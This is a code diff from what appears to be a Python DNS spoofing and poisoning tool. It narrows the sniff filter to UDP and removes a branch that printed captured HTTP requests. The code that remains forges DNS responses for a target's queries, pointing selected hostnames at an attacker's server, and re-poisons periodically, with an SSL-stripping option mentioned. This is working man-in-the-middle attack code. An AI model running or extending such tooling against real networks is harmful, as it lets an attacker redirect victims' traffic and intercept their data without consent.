@@ -60,7 +60,7 @@ def dns_spoofing(ssl_strip=False):
 
 def dns_spoof_and_repoison(my_addresses, gateways, target, server, iface):
     last_poison_time = time.time() - REPOISON_TIME
-    _filter = "udp or tcp"
+    _filter = "udp"
 
     while True:
         # sniff for 1 packet that adheres to the {_filter}
@@ -82,9 +82,6 @@ def process_udp_pkt(target, server, iface):
         if pkt.haslayer(DNS) and pkt[IP].src == target['ip'] and pkt[DNSQR].qname in dns_hosts:
             resp_packet = build_dns_response_packet(pkt, server["ip"])
             sendp(resp_packet, iface=iface)
-
-        elif pkt.haslayer(HTTPRequest):
-            print(pkt.show())
             
             #spoof.printf("Found another packet")
     return process_udp_pkt_inside
